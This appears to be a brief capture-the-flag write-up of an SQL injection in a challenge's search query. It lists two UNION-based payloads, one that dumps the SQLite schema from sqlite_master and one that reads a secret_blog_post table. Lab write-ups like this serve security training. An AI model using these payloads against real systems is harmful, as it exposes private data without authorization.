# Challenge `Wow, it can't be more juicy than this!` writeup

- **Vulnerability:** SQL injection
- **Where:** in search query
- **Impact:** Allows query for other values in database.

## Steps to reproduce

1. Firstly check database schema and available tables with: `' UNION Select name, tbl_name, sql from sqlite_master --`
1. After detecting table with secret blog posts, update the query to include results from that table: `' UNION Select id, title, content from secret_blog_post --`
